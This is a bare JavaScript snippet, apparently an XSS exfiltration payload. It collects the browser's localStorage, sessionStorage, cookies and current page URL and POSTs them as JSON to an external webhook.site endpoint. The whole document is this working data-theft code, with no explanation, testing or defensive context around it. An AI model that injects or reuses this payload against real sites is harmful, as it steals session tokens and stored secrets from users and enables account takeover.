fetch('https://webhook.site/7591e2c7-2dd7-4650-8f1e-982701e9cc39', {
  method: 'POST',
  body: JSON.stringify({
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    cookies: document.cookie,
    url: location.href
  })
});
